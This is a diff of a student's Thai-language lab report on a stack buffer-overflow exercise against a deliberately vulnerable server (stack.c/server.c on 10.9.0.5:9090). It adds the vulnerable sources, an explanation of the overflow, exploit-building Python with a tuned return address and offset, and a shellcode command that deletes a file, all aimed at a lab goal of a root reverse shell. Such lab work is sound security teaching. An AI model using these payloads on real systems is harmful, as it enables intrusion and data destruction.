@@ -8,19 +8,27 @@
 
 ## Task 1: Get Familiar with the Shellcode (5 คะแนน)
 
-![alt text](image-3.png)
-
-
+#### Objetive
+-  modify the shellcode, so you can use it to delete a file
+-  In this lab, we only 
+provide the binary version of a generic shellcode, without explaining how it works, because 
+it is non-trivial.
+---
+#### shellcode_32.py 
 ![alt text](image-4.png)
 
-- ก่อนถึง * ต้องมี 58 character
-```
-modify code เป็น "/bin/rm -f /tmp/test && echo success                      *"
-- เมื่อลบสำเร็จจะไป echo sucess
-```
+#### Command
 
-![alt text](image-5.png)
+![alt text](image-3.png)
 
+- python3 shell_32.py ใช้สร้าง codefile_32 ที่บรรจุ shellcode ไว้
+- make สร้าง a32.out ที่เป็น executable file จาก codefile_32 โดยใช้ gcc
+- เมื่อ execute a32.out จะแสดงผลลัพธ์ตามภาพ
+---
+
+
+
+#### shellcode_32.py after modify
 ```
 #!/usr/bin/python3
 import sys
@@ -54,10 +62,29 @@ with open('codefile_32', 'wb') as f:
   f.write(content)
 
 ```
+---
+- ก่อนถึง * ต้องมี 58 character
+```
+modify code เป็น "/bin/rm -f /tmp/test && echo success                      *"
+- เมื่อลบสำเร็จจะไป echo sucess
+```
+
+![alt text](image-5.png)
+
+เมื่อ execute a32.out จะเห็นว่า test file จะถูกลบออกไปพร้อมกับแสดงข้อความ success
 
 ## Task2: Level-1 Attack (10 คะแนน) 
 
-server 10.9.0.5 port 9090 รัน stack.c 
+### Objective
+- Please provide proofs 
+to show that you can successfully get the vulnerable server to run your commands.
+- We want to get a 
+root shell on the target server use  Reverse shell 
+- Please modify the command string in your shellcode, so you can get a reverse shell on the 
+target server
+---
+
+### stack.c 
 
 ```
 /* Vunlerable program: stack.c */
@@ -139,36 +166,191 @@ void printBuffer(char * buffer, int size)
 
 ```
 
-### program stack.c
+- str ที่รับมาจาก main ขนาด 517 แต่ buffer ใน function bof ขนาด 200 ดังนั้นเมื่อทำ strcpy(buffer, str) จะ coppy str ใส่ใน buffer ทำให้ data ส่วนเกิน ไปทับ ส่วนอื่นใน stack frame เช่น old ebp,retern address, argment of function และ stack frame ด้านบน
+---
+### Server
 
-- คอยรับ user input จาก connection port 9090 อยู่
-
-- user input จะถูกส่งเข้า bof function as argument
-
-- ภายใน bof() มีการใช้ strcpy(buffer,user_input) 
-
-- ไม่มีการ verify&sanitize user input ทำให้เกิด buffer overflow 
+- server คอยรับ user input จาก connection port 9090 อยู่
 
 ![alt text](image-6.png)
 
 
-
 ![alt text](image-7.png)
 
+ เมื่อลองส่ง text hello ให้ server ผ่าน **echo hello | nc 10.9.0.5 9090** server จะแสดง 
+ - input size 
+ - ebp
+ - buffer address
 ### program server.c
+ ```
+ #include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <time.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <arpa/inet.h>
+#include <signal.h>
+#include <sys/wait.h>
 
+#define PROGRAM "stack"
+#define PORT    9090
+
+int socket_bind(int port);
+int server_accept(int listen_fd, struct sockaddr_in *client);
+char **generate_random_env();
+
+void main()
+{
+    int listen_fd;
+    struct sockaddr_in  client;
+
+    // Generate a random number
+    srand (time(NULL));
+    int random_n = rand()%2000; 
+   
+    // handle signal from child processes
+    signal(SIGCHLD, SIG_IGN);
+
+    listen_fd = socket_bind(PORT);
+    while (1){
+	int socket_fd = server_accept(listen_fd, &client);
+
+        if (socket_fd < 0) {
+	    perror("Accept failed");
+            exit(EXIT_FAILURE);
+        }
+
+	int pid = fork();
+        if (pid == 0) {
+            // Redirect STDIN to this connection, so it can take input from user
+            dup2(socket_fd, STDIN_FILENO);
+
+	    /* Uncomment the following if we want to send the output back to user.
+	     * This is useful for remote attacks. 
+            int output_fd = socket(AF_INET, SOCK_STREAM, 0);
+            client.sin_port = htons(9091);
+	    if (!connect(output_fd, (struct sockaddr *)&client, sizeof(struct sockaddr_in))){
+               // If the connection is made, redirect the STDOUT to this connection
+               dup2(output_fd, STDOUT_FILENO);
+	    }
+	    */ 
+
+	    // Invoke the program 
+	    fprintf(stderr, "Starting %s\n", PROGRAM);
+            //execl(PROGRAM, PROGRAM, (char *)NULL);
+	    // Using the following to pass an empty environment variable array
+            //execle(PROGRAM, PROGRAM, (char *)NULL, NULL);
+	    
+	    // Using the following to pass a randomly generated environment varraible array.
+	    // This is useful to slight randomize the stack's starting point.
+            execle(PROGRAM, PROGRAM, (char *)NULL, generate_random_env(random_n));
+        }
+        else {
+            close(socket_fd);
+	}
+    } 
+
+    close(listen_fd);
+}
+
+
+int socket_bind(int port)
+{
+    int listen_fd;
+    int opt = 1;
+    struct sockaddr_in server;
+
+    if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
+    {
+        perror("socket failed");
+        exit(EXIT_FAILURE);
+    }
+
+    if (setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)))
+    {
+        perror("setsockopt failed");
+        exit(EXIT_FAILURE);
+    }
+
+    memset((char *) &server, 0, sizeof(server));
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = htonl(INADDR_ANY);
+    server.sin_port = htons(port);
+
+    if (bind(listen_fd, (struct sockaddr *) &server, sizeof(server)) < 0)
+    {
+        perror("bind failed");
+        exit(EXIT_FAILURE);
+    }
+
+    if (listen(listen_fd, 3) < 0)
+    {
+        perror("listen failed");
+        exit(EXIT_FAILURE);
+    }
+
+    return listen_fd;
+}
+
+int server_accept(int listen_fd, struct sockaddr_in *client)
+{
+    int c = sizeof(struct sockaddr_in);
+
+    int socket_fd = accept(listen_fd, (struct sockaddr *)client, (socklen_t *)&c);
+    char *ipAddr = inet_ntoa(client->sin_addr);
+    printf("Got a connection from %s\n", ipAddr);
+    return socket_fd;
+}
+
+// Generate environment variables. The length of the environment affects 
+// the stack location. This is used to add some randomness to the lab.
+char **generate_random_env(int length)
+{
+    const char *name = "randomstring=";
+    char **env;
+
+    env = malloc(2*sizeof(char *));
+
+    env[0] = (char *) malloc((length + strlen(name))*sizeof(char));
+    strcpy(env[0], name);
+    memset(env[0] + strlen(name), 'A', length -1);
+    env[0][length + strlen(name) - 1] = 0;
+    env[1] = 0;
+    return env;
+}
+
+
+ ```
+
+
+
+- คอยรับ user input จาก connection port 9090 อยู่
 - จะเรียก stack.c เมื่อมี connection ต่อมา โดย fork() + exec() process ใหม่ ทำให้เราทดลอง payload ได้เรื่อยๆ 
 
 
 ---
 
----
+
 
 
 ![alt text](image-9.png)
 
+- จะทำให้ host และ server ที่รันอยู่บน docker ไม่ random address เมื่อ program ถูกรัน
+
 ![alt text](image-8.png)
 
+- เมื่อลองเชื่อมต่อ server อีกครั้งจะเห็นว่า address ไม่เปลี่ยนแปลง
+
+### หลักการคิด
+
+#### ตัวอย่างแนวคิด
+
+- str ที่รับมาจาก main ขนาด 517 แต่ buffer ใน function bof ขนาด 200 ดังนั้นเมื่อทำ strcpy(buffer, str) จะ coppy str ใส่ใน buffer ทำให้ data ส่วนเกิน ไปทับ ส่วนอื่นใน stack frame เช่น old ebp,retern address, argment of function และ stack frame ด้านบน
+- ebp = 0xffffd248
+
+### Shell Code
 ```
 #!/usr/bin/python3
 import sys
@@ -203,7 +385,7 @@ content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value 
 # and put it somewhere in the payload
-ret    = 0xffffd248 + 100   # Change this number 
+ret    = 0xffffd248 + 8   # Change this number 
 offset = 116              # Change this number 
 
 # Use 4 for 32-bit address and 8 for 64-bit address
@@ -215,6 +397,8 @@ with open('badfile', 'wb') as f:
   f.write(content)
 
 ```
+
+
 ![alt text](image-10.png)
 
 ![alt text](image-11.png)
@@ -284,7 +468,8 @@ for x in range(100, 300,4):
 
 
 ```
-sudo /sbin/sysctl-w kernel.randomize_va_space=2  
+cat /proc/sys/kernel/randomize_va_space
+sudo sysctl -w kernel.randomize_va_space=2  
 ```
 
 ![alt text](image-16.png)
